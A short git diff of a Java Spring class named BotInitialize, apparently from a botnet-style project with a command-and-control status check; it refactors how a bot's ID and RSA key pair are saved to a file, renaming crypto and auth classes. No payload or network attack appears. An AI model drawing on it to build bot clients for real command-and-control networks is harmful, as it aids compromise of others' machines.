@@ -8,13 +8,14 @@ import java.util.ArrayList;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
 
-import cs.sii.bot.active.CryptoAuth;
-import cs.sii.bot.active.CryptoPKI;
+import cs.sii.bot.active.BotAuth;
 import cs.sii.config.bot.Engine;
 import cs.sii.domain.FileUtil;
 import cs.sii.domain.Pairs;
 import cs.sii.service.connection.AsyncRequest;
 import cs.sii.service.connection.NetworkService;
+import cs.sii.service.crypto.CryptoPKI;
+import cs.sii.service.crypto.CryptoUtils;
 
 @Service
 public class BotInitialize {
@@ -29,13 +30,13 @@ public class BotInitialize {
 	private AsyncRequest request;
 
 	@Autowired
-	private CryptoAuth auth;
+	private BotAuth auth;
 
 	@Autowired
 	private CryptoPKI pki;
 
 	@Autowired
-	private FileUtil fileUtil;
+	private CryptoUtils cryptoUtils;
 
 	public BotInitialize() {
 	}
@@ -43,7 +44,7 @@ public class BotInitialize {
 	public void initializeBot() throws IOException, NoSuchAlgorithmException, NoSuchProviderException {
 
 		ArrayList<String> param = new ArrayList<String>();
-		param = fileUtil.decodeFromFile();
+		param = cryptoUtils.decodeStringFromFile("");
 
 		if (param.size() > 0) {
 			String idBot = param.get(0);
@@ -56,7 +57,8 @@ public class BotInitialize {
 			data.add(networkService.generateID());
 			data.add(pki.getPubRSAKey());
 			data.add(pki.getPrivRSAKey());
-			fileUtil.encodeToFile(data);
+			cryptoUtils.encodeObjToFile("",data);
+			
 		}
 
 		if (!engineBot.isCommandandconquerStatus()) {
